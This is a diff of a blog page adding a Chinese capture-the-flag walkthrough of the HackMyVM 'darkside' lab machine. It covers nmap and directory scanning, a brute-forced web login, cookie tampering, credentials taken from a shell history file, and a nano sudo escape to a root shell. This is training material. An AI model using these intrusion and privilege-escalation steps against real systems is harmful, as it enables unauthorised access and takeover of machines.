@@ -17,22 +17,28 @@
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
   <meta name="theme-color" content="#f9fafb">
-  <title>CMACCKK blog</title>
+  <title>quick - CMACCKK blog</title>
 
   
-    <meta property="og:type" content="website">
-<meta property="og:title" content="CMACCKK blog">
-<meta property="og:url" content="https://cmacckk.github.io/topic/">
+    <meta name="description" content="darkside 靶机ip: 192.168.1.97 攻击机ip: 192.168.1.93  信息收集12345678910111213141516171819202122(base) Downloads nmap -sC -sV -p- 192.168.1.97Starting Nmap 7.95 ( https:&#x2F;&#x2F;nmap.org ) at 2025-07-07 18:05 CSTNma">
+<meta property="og:type" content="article">
+<meta property="og:title" content="quick">
+<meta property="og:url" content="https://cmacckk.github.io/2025/07/07/darkside/">
 <meta property="og:site_name" content="CMACCKK blog">
+<meta property="og:description" content="darkside 靶机ip: 192.168.1.97 攻击机ip: 192.168.1.93  信息收集12345678910111213141516171819202122(base) Downloads nmap -sC -sV -p- 192.168.1.97Starting Nmap 7.95 ( https:&#x2F;&#x2F;nmap.org ) at 2025-07-07 18:05 CSTNma">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://cmacckk.github.io/avatar.jpg">
+<meta property="article:published_time" content="2025-07-07T00:00:00.000Z">
+<meta property="article:modified_time" content="2025-07-28T09:04:49.116Z">
 <meta property="article:author" content="CMACCKK">
-<meta name="twitter:card" content="summary">
+<meta property="article:tag" content="后台密码爆破">
+<meta property="article:tag" content="nano提权">
+<meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://cmacckk.github.io/avatar.jpg">
   
   
   
-  
+  <meta name="keywords" content="后台密码爆破,nano提权">
 
   <!-- feed -->
   
@@ -44,12 +50,12 @@
 
   
 
-  <script type="application/ld+json">{"@context":"https://schema.org","@type":"Website","@id":"https://cmacckk.github.io","author":{"@type":"Person","name":"CMACCKK","sameAs":[],"image":"https://cmacckk.github.io/avatar.jpg"},"name":"CMACCKK blog","description":"","url":"https://cmacckk.github.io"}</script>
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"CMACCKK","sameAs":[],"image":"https://cmacckk.github.io/avatar.jpg"},"dateCreated":"2025-07-07T00:00:00Z","dateModified":"2025-07-28T09:04:49Z","datePublished":"2025-07-07T00:00:00Z","description":"","headline":"quick","mainEntityOfPage":{"@type":"WebPage","@id":"https://cmacckk.github.io/2025/07/07/darkside/"},"publisher":{"@type":"Organization","name":"CMACCKK","sameAs":[],"image":"https://cmacckk.github.io/avatar.jpg","logo":{"@type":"ImageObject","url":"https://cmacckk.github.io/avatar.jpg"}},"url":"https://cmacckk.github.io/2025/07/07/darkside/","keywords":"后台密码爆破, nano提权","thumbnailUrl":"./img/darkside/cover.png","image":1}</script>
   
 </head>
 <body>
 
-<div class="l_body index" id="start" layout="index_topic" type="undefined" ><aside class="l_left"><div class="sidebg"></div><div class="leftbar-container">
+<div class="l_body content" id="start" layout="post" type="tech" ><aside class="l_left"><div class="sidebg"></div><div class="leftbar-container">
 
 
 <header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="https://cmacckk.github.io/avatar.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main">CMACCKK blog</div></a></div></header>
@@ -61,23 +67,106 @@
 <div class="widgets">
 <div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
 
+<widget class="widget-wrapper related post-list"><div class="widget-header dis-select"><span class="name">专栏：hackmyvm</span></div><div class="widget-body"><a class="item active" href="/2025/07/07/darkside/"><span class="title">quick</span><svg class="active-icon" xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M21 11.098v4.993c0 3.096 0 4.645-.734 5.321c-.35.323-.792.526-1.263.58c-.987.113-2.14-.907-4.445-2.946c-1.02-.901-1.529-1.352-2.118-1.47a2.225 2.225 0 0 0-.88 0c-.59.118-1.099.569-2.118 1.47c-2.305 2.039-3.458 3.059-4.445 2.945a2.238 2.238 0 0 1-1.263-.579C3 20.736 3 19.188 3 16.091v-4.994C3 6.81 3 4.666 4.318 3.333C5.636 2 7.758 2 12 2c4.243 0 6.364 0 7.682 1.332C21 4.665 21 6.81 21 11.098" opacity=".5"/><path fill="currentColor" d="M9 5.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5z"/></svg></a><a class="item" href="/2025/06/11/quick/"><span class="title">quick</span></a></div></widget>
+
 <widget class="widget-wrapper recent post-list"><div class="widget-header dis-select"><span class="name">最近更新</span></div><div class="widget-body fs14"><a class="item title" href="/2025/07/07/darkside/"><span class="title">quick</span></a><a class="item title" href="/2025/06/11/quick/"><span class="title">quick</span></a></div></widget>
 </div>
 
 </div></aside><div class="l_main" id="main">
 
-<header class="header mobile-only"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="https://cmacckk.github.io/avatar.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main">CMACCKK blog</div></a></div></header>
 
 
 
 
-<div class="navbar top"><div class="navbar-blur"><div class="navbar-container"><nav class="post"><a href="/">近期发布</a><a href="/tags/">标签</a><a class="active" href="/topic/">专栏</a><a href="/archives/">归档</a></nav></div></div></div><div class="post-list wiki topic"><a class="post-card wiki topic" href="/2025/07/07/darkside/">
-<article class="md-text"><div class="preview"><img src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/10433048.png"/></div><div class="excerpt"><h2 class="post-title">hackmyvm</h2><p>关于hackmyvm个人刷题笔记</p></div></article>
-</a></div>
+<div class="article banner top">
+  <div class="content">
+    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
+<span class="sep"></span><a class="cap breadcrumb" id="menu" href="/topic/">专栏</a><span class="sep"></span><a class="cap breadcrumb" id="proj" href="/2025/07/07/darkside/">hackmyvm</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2025-07-07T00:00:00.000Z">2025-07-07</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2025-07-28T09:04:49.116Z">2025-07-28</time></span></div></div></div>
+    
+    <div class="bottom only-title">
+      
+      <div class="text-area">
+        <h1 class="text title"><span>quick</span></h1>
+        
+      </div>
+    </div>
+    
+  </div>
+  </div><article class="md-text content"><h1 id="darkside"><a href="#darkside" class="headerlink" title="darkside"></a>darkside</h1><ul>
+<li>靶机ip: 192.168.1.97</li>
+<li>攻击机ip: 192.168.1.93</li>
+</ul>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">(base) Downloads nmap -sC -sV -p- 192.168.1.97</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-07 18:05 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.97</span><br><span class="line">Host is up (0.0050s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (conn-refused)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   3072 e0:25:46:8e:b8:bb:ba:69:69:1b:a7:4d:28:34:04:<span class="built_in">dd</span> (RSA)</span><br><span class="line">|   256 60:12:04:69:5e:c4:a1:42:2d:2b:51:8a:57:fe:a8:8a (ECDSA)</span><br><span class="line">|_  256 84:bb:60:b7:79:5d:09:9c:<span class="built_in">dd</span>:24:23:a3:f2:65:89:3f (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.56 ((Debian))</span><br><span class="line">|_http-title: The DarkSide</span><br><span class="line">| http-cookie-flags:</span><br><span class="line">|   /:</span><br><span class="line">|     PHPSESSID:</span><br><span class="line">|_      httponly flag not <span class="built_in">set</span></span><br><span class="line">|_http-server-header: Apache/2.4.56 (Debian)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 27.50 seconds</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">(pwncat) ➜  Downloads feroxbuster -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt,bak,md -u http://192.168.1.97 -C 404 -d 1</span><br><span class="line"></span><br><span class="line"> ___  ___  __   __     __      __         __   ___</span><br><span class="line">|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__</span><br><span class="line">|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___</span><br><span class="line">by Ben <span class="string">&quot;epi&quot;</span> Risher 🤓                 ver: 2.11.0</span><br><span class="line">───────────────────────────┬──────────────────────</span><br><span class="line"> 🎯  Target Url            │ http://192.168.1.97</span><br><span class="line"> 🚀  Threads               │ 50</span><br><span class="line"> 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</span><br><span class="line"> 💢  Status Code Filters   │ [404]</span><br><span class="line"> 💥  Timeout (secs)        │ 7</span><br><span class="line"> 🦡  User-Agent            │ feroxbuster/2.11.0</span><br><span class="line"> 💉  Config File           │ /etc/feroxbuster/ferox-config.toml</span><br><span class="line"> 🔎  Extract Links         │ <span class="literal">true</span></span><br><span class="line"> 💲  Extensions            │ [php, html, txt, bak, md]</span><br><span class="line"> 🏁  HTTP methods          │ [GET]</span><br><span class="line"> 🔃  Recursion Depth       │ 1</span><br><span class="line">───────────────────────────┴──────────────────────</span><br><span class="line"> 🏁  Press [ENTER] to use the Scan Management Menu™</span><br><span class="line">──────────────────────────────────────────────────</span><br><span class="line">404      GET        9l       31w      274c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter</span><br><span class="line">403      GET        9l       28w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter</span><br><span class="line">200      GET       29l       45w      683c http://192.168.1.97/index.php</span><br><span class="line">200      GET       74l      300w     2121c http://192.168.1.97/styles.css</span><br><span class="line">200      GET       29l       45w      683c http://192.168.1.97/</span><br><span class="line">301      GET        9l       28w      313c http://192.168.1.97/backup =&gt; http://192.168.1.97/backup/</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(base) Downloads curl http://192.168.1.97/backup/vote.txt</span><br><span class="line">rijaba: Yes</span><br><span class="line">xerosec: Yes</span><br><span class="line">sml: No</span><br><span class="line">cromiphi: No</span><br><span class="line">gatogamer: No</span><br><span class="line">chema: Yes</span><br><span class="line">talleyrand: No</span><br><span class="line">d3b0o: Yes</span><br><span class="line"></span><br><span class="line">Since the result was a draw, we will <span class="built_in">let</span> you enter the darkside, or at least temporarily, good luck kevin.</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(base) Downloads curl http://192.168.1.97/backup/vote.txt &gt; vote.txt</span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">100   205  100   205    0     0   4191      0 --:--:-- --:--:-- --:--:--  4270</span><br><span class="line">(base) Downloads <span class="built_in">cat</span> vote.txt | awk -F <span class="string">&#x27;:&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | grep -Ev <span class="string">&#x27;^$&#x27;</span> | grep -Ev <span class="string">&#x27;Since*&#x27;</span> &gt; user.txt</span><br><span class="line">(base) Downloads <span class="built_in">echo</span> <span class="string">&#x27;kevin&#x27;</span> &gt;&gt; user.txt</span><br></pre></td></tr></table></figure>
+
+<h2 id="后台密码爆破"><a href="#后台密码爆破" class="headerlink" title="后台密码爆破"></a>后台密码爆破</h2><p>这里跑的太慢了，最后看wp找密码</p>
+<p><img src="/./img/darkside/darkside-1.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kevin/iloveyou</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./img/darkside/darkside-3.png"></p>
+<p>解密出来是</p>
+<p><code>sfqekmgncutjhbypvxda.onion</code></p>
+<p><img src="/./img/darkside/darkside-2.png"></p>
+<p><img src="/./img/darkside/darkside-4.png"></p>
+<p><img src="/./img/darkside/darkside-5.png"></p>
+<p>修改<code>Cookie</code></p>
+<p><img src="/./img/darkside/darkside-6.png"></p>
+<p><img src="/./img/darkside/darkside-7.png"></p>
+<p>最终获得</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kevin:ILoveCalisthenics</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">kevin@darkside:~$ <span class="built_in">ls</span> -al</span><br><span class="line">total 32</span><br><span class="line">drwxr-xr-x 3 kevin kevin 4096 Oct 30  2023 .</span><br><span class="line">drwxr-xr-x 4 root  root  4096 Oct 15  2023 ..</span><br><span class="line">lrwxrwxrwx 1 kevin kevin    9 Oct 30  2023 .bash_history -&gt; /dev/null</span><br><span class="line">-rw-r--r-- 1 kevin kevin  220 Oct 15  2023 .bash_logout</span><br><span class="line">-rw-r--r-- 1 kevin kevin 3526 Oct 15  2023 .bashrc</span><br><span class="line">-rw-r--r-- 1 kevin kevin  113 Oct 15  2023 .<span class="built_in">history</span></span><br><span class="line">drwxr-xr-x 3 kevin kevin 4096 Oct 15  2023 .<span class="built_in">local</span></span><br><span class="line">-rw-r--r-- 1 kevin kevin  807 Oct 15  2023 .profile</span><br><span class="line">-rw-r--r-- 1 kevin kevin   19 Oct 15  2023 user.txt</span><br><span class="line">kevin@darkside:~$ <span class="built_in">cat</span> .<span class="built_in">history</span></span><br><span class="line"><span class="built_in">ls</span> -al</span><br><span class="line">hostname -I</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Congratulations on the OSCP Xerosec&quot;</span></span><br><span class="line">top</span><br><span class="line">ps -faux</span><br><span class="line">su rijaba</span><br><span class="line">ILoveJabita</span><br><span class="line"><span class="built_in">ls</span> /home/rijaba</span><br><span class="line">kevin@darkside:~$ su - rijaba</span><br><span class="line">Password:</span><br><span class="line">rijaba@darkside:~$</span><br></pre></td></tr></table></figure>
+
+<h2 id="nano提权"><a href="#nano提权" class="headerlink" title="nano提权"></a>nano提权</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">rijaba@darkside:~$ <span class="built_in">sudo</span> -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> rijaba on darkside:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User rijaba may run the following commands on darkside:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/nano</span><br><span class="line">rijaba@darkside:~$ nano</span><br><span class="line">^R^X</span><br><span class="line">reset; bash 1&gt;&amp;0 2&gt;&amp;0</span><br></pre></td></tr></table></figure>
+
+</article>
+<div class="article-footer">
+    <section id="license">
+      <div class="header"><span>许可协议</span></div>
+      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div>
+    </section>
+    
+
+</div>
+
+<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2025/06/11/quick/">quick</a></div></section></div>
+
+
+
+
+  <div class="related-wrap md-text" id="comments">
+    <section class='header cmt-title cap theme'>
+      <p>快来参与讨论吧~</p>
+
+    </section>
+    <section class='body cmt-body beaudar'>
+      
+
+<svg class="loading" style="vertical-align:middle;fill:currentColor;overflow:hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg>
+
+<div id="beaudar" repo="cmacckk/blog-comments" issue-term="pathname" theme="preferred-color-scheme" input-position="top" comment-order="desc" loading="false" branch="main"></div>
+
+    </section>
+  </div>
+
+
+
 <footer class="page-footer footnote"><hr><div class="text"><p>本站由 <a href="/">CMACCKK</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.33.0">Stellar 1.33.0</a> 主题创建。<br>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
 </div></footer>
 <div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
-</aside><div class='float-panel'>
+<div class="widgets">
+
+
+
+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#darkside"><span class="toc-text">darkside</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E5%8F%B0%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4"><span class="toc-text">后台密码爆破</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#nano%E6%8F%90%E6%9D%83"><span class="toc-text">nano提权</span></a></li></ol></li></ol></div><div class="widget-footer"><a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Solar by 480 Design - https://creativecommons.org/licenses/by/4.0/ --><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5"><path stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/><path d="M7 3.338A9.95 9.95 0 0 1 12 2c5.523 0 10 4.477 10 10s-4.477 10-10 10S2 17.523 2 12c0-1.821.487-3.53 1.338-5"/></g></svg><span>回到顶部</span></a><a class="buttom" onclick="util.scrollComment()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Solar by 480 Design - https://creativecommons.org/licenses/by/4.0/ --><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5" d="M8 10.5h8M8 14h5.5M17 3.338A9.95 9.95 0 0 0 12 2C6.477 2 2 6.477 2 12c0 1.6.376 3.112 1.043 4.453c.178.356.237.763.134 1.148l-.595 2.226a1.3 1.3 0 0 0 1.591 1.592l2.226-.596a1.63 1.63 0 0 1 1.149.133A9.96 9.96 0 0 0 12 22c5.523 0 10-4.477 10-10c0-1.821-.487-3.53-1.338-5"/></svg><span>参与讨论</span></a></div></widget>
+</div></aside><div class='float-panel'>
   <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
     <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
   </button>
@@ -571,6 +660,31 @@
 
 
 <!-- optional -->
+
+  <script type="module">
+  const el = document.querySelector('#comments #beaudar');
+  util.viewportLazyload(el, load_beaudar, false);
+
+  function load_beaudar() {
+    if (!el) return;
+    try {
+      el.innerHTML = '';
+    } catch (error) {
+      console.error(error);
+    }
+    const script = document.createElement('script');
+    script.src = 'https://beaudar.lipk.org/client.js';
+    script.async = true;
+    for (const key of Object.keys(el.attributes)) {
+      const attr = el.attributes[key];
+      if (['class', 'id'].includes(attr.name) === false) {
+        script.setAttribute(attr.name, attr.value);
+      }
+    }
+    el.appendChild(script);
+  }
+</script>
+
 
 
 
